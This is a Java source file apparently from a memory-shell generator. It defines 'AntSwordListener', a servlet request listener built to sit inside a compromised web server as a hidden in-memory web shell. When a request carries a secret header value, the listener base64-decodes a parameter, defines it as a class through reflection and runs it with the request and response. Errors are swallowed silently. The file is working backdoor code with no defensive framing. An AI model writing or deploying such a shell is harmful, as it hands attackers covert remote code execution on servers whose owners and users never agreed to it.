package jmg.antsword.memshell;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class AntSwordListener implements ServletRequestListener {
    public String pass;
    public String headerName;
    public String headerValue;

    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            HttpServletResponse response = getResponseFromRequest(request);
            if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
                String cls = request.getParameter(pass);
                if (cls != null) {
                    try {
                        byte[] data = base64Decode(cls);
                        URLClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                        method.setAccessible(true);
                        Class clazz = (Class) method.invoke(classLoader, data, new Integer(0), new Integer(data.length));
                        clazz.newInstance().equals(new Object[]{request, response});
                    } catch (Exception var7) {
                    }
                }
            }

        } catch (Exception ignored) {
        }
    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest var1) throws Exception {
        return null;
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
        }
    }

}
